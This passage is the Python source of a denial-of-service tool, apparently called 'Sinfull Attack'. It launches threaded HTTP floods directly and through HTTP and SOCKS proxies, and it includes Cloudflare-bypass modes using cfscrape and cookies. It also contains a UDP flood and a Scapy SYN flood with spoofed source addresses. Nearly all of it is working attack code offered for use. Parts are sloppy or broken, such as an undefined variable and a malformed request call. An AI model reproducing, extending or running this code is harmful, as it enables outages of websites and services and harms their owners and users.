    multiple = int(100)
    connection = "Connection: Keep-Alive\r\n"
    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
    if choice_mode == "0":
        for x in range(threads):
            Home(x+1).start()
    elif choice_mode == "1":
        for x in range(threads):
            Proxy(x+1).start()
    elif choice_mode == "2":
        for x in range(threads):
            Socks(x+1).start()
    elif choice_mode == "3":
        if method_pass_cf == "1":
            for x in range(threads):
                BypassV1(x+1).start()
        else:
            for x in range(threads):
                BypassV2(x+1).start()
    elif choice_mode == "4":
        for x in range(threads):
            raw_dos(x+1).start()
    elif choice_mode == "5":
        for x in range(threads):
            udpflood()
    elif choice_mode == "6":
        for x in range(threads):
            synflood(x+1).start()

class raw_dos(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
    def run(self):
        global req_code, error
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : random.choice(useragents),
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8"}
        if method_attack == "1":
            requests.get(url, headers=headersx)
        else:
            requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
        while True:
            try:
                if method_attack == "1":
                    requests.get(url, headers=headersx)
                else:
                    requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                print("Sinfull Attack" +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                while True:
                    try:
                        for _ in range(100):
                            if method_attack == "1":
                                requests.get(url, headers=headersx)
                            else:
                                requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
                    except:
                        try:
                            pass
                        except:
                            pass
            except:
                try:
                    pass
                except:
                    pass

class Proxy(threading.Thread):

    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            #request  = get_host + useragent + accept + referer + forward + content + length + connection + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(proxy[0]), int(proxy[1])))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                #req_code += 1
                #sys.stdout.write("Sinfull Attack Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                print("Sinfull Attack:Proxy=> " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        #req_code += 1
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    proxy = random.choice(proxies).strip().split(":")
                except:
                    pass

class Socks(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
        forward   = "X-Forwarded-For: " + randomip + "\r\n"
        forward  += "Client-IP: " + randomip + "\r\n"
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
           get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
           request  = get_host + useragent + accept + forward + connection + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + forward + connection + "\r\n"
            #request  = get_host + useragent + accept + referer + content + length + "\r\n"
        current = x
        if current < len(proxies):
            proxy = proxies[current].strip().split(':')
        else:
            proxy = random.choice(proxies).strip().split(":")
        while True:
            try:
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
                s = socks.socksocket()
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("Sinfull Attack Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    try:
                        s.close()
                    except:
                        pass
            except:
                try:
                    s.close()
                except:
                    pass
                try:
                    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
                    s = socks.socksocket()
                    s.connect((str(host_url), int(port)))
                    if str(port) == '443':
                        s = ssl.wrap_socket(s)
                    s.send(str.encode(request))
                    print("Sinfull Attack:Socks4=> " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                    try:
                        for y in range(multiple):
                            s.send(str.encode(request))
                    except:
                        try:
                            s.close()
                        except:
                            pass
                except:
                    try:
                        s.close()
                        proxy = random.choice(proxies).strip().split(":")
                    except:
                        pass

class Home(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
        accept    = random.choice(acceptall)
        referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
        if method_attack == "1":
            get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + content + length + "\r\n"
        else:
            get_host = random.choice(['GET','POST','HEAD'])+ " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
            request  = get_host + useragent + accept + referer + content + length + "\r\n"
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((str(host_url), int(port)))
                if str(port) == '443':
                    s = ssl.wrap_socket(s)
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("Sinfull Attack:Home=> " +str(random.randint(0, 1000))+ " => " +str(host_url)+ ":" +str(port))
                #req_code += 1
                #sys.stdout.write("Sinfull Attack Sent [" +str(req_code)+ "] | Error [" +str(error)+ "]|=> [" +host_url+ ":" +str(port)+ "]\r")
                #sys.stdout.flush()
                try:
                    for y in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        req_code += 1
                except:
                    try:
                        s.close()
                        error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass

class BypassV1(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        http = urllib3.PoolManager()

    def run(self):
        global req_code, error
        http = urllib3.PoolManager()
        headersx={"Host" : str(host_url),
        "Connection" : "keep-alive",
        "Cache-Control" : "max-age=0",
        "Upgrade-Insecure-Requests" : "1",
        "User-Agent" : user,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
        "Accept-Encoding" : "gzip, deflate",
        "Accept-Language" : "vi,en;q=0.9,en-US;q=0.8",
        "Cookie" : cookie}
        while True:
            try:
                if method_attack == "1":
                    http.request("GET", url, headers=headersx)
                else:
                    http.request("GET /?=" +str(random.randint(0,20000)), headers=headersx)
                print("Sinfull Attack:Bypass1-Normal=> " +str(random.randint(0, 1000))+ " => " +str(host_url))
                try:
                    for y in range(multiple):
                        http.request("GET", url,headers=headersx)
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    #error += 1
                except:
                    pass

class BypassV2(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter
        scraper = cfscrape.create_scraper()

    def run(self):
        global req_code, error
        scraper = cfscrape.create_scraper()
        while True:
            try:
                if method_attack == "1":
                    soso = scraper.get(url, timeout=15)
                    soso = scraper.head(url, timeout=15)
                    soso = scraper.post(url, timeout=15)                                        
                else:
                    soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                    soso = scraper.head(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                    soso = scraper.post(url+ "?=" +str(random.randint(0,20000)), timeout=15)                    
                print("Sinfull Attack:Bypass2-Normal=> " +str(random.randint(0, 1000))+ " => " +str(host_url))
                #req_code += 1
                try:
                    for y in range(multiple):
                        #req_code += 1
                        if method_attack == "1":
                            soso = scraper.get(url, timeout=15)
                            soso = scraper.head(url, timeout=15)
                            soso = scraper.post(url, timeout=15)                             
                        else:
                            soso = scraper.get(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                            soso = scraper.head(url+ "?=" +str(random.randint(0,20000)), timeout=15)
                            soso = scraper.post(url+ "?=" +str(random.randint(0,20000)), timeout=15)                            
                except:
                    try:
                        s.close()
                        #error += 1
                    except:
                        pass
            except:
                try:
                    s.close()
                    #error += 1
                except:
                    pass

def udpflood():
    global req_code, error
    tar = (str(host_ip),int(port))
    bytes = random._urandom(1180) #1475
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            req_code += 1
            s.sendto(bytes,tar)
            sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()
            try:
                for y in range(multiple):
                    s.sendto(bytes,tar)
                    req_code += 1
                    sys.stdout.write("[+] UDP Flood | [" +host_url+ ":" +str(port)+ "] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
                    sys.stdout.flush()
            except:
                try:
                    s.close()
                    error += 1
                except:
                    pass
        except:
            try:
                s.close()
                error += 1
            except:
                pass

class synflood(threading.Thread):
    def __init__(self, counter):
        threading.Thread.__init__(self)
        self.counter = counter

    def run(self):
        global req_code, error
        while True:
            s_port = random.randint(1000,9000)
            s_eq = random.randint(1000,9000)
            w_indow = random.randint(1000,9000)
        
            IP_Packet = IP ()
            IP_Packet.src = ".".join(map(str, (randint(0,255)for _ in range(4))))
            IP_Packet.dst = host_url
        
            TCP_Packet = TCP ()
            TCP_Packet.sport = s_port
            TCP_Packet.dport = port
            TCP_Packet.flags = "S"
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow
            try:
                send(IP_Packet/TCP_Packet, verbose=0)
                req_code += 1
            except:
                try:
                    error += 1
                except:
                    pass
            sys.stdout.write("[+] SYN Flood [ DDoS ] | Sent [" +str(req_code)+ "] | Error: [" +str(error)+ "]\r")
            sys.stdout.flush()

if __name__ == '__main__':
    start_url()
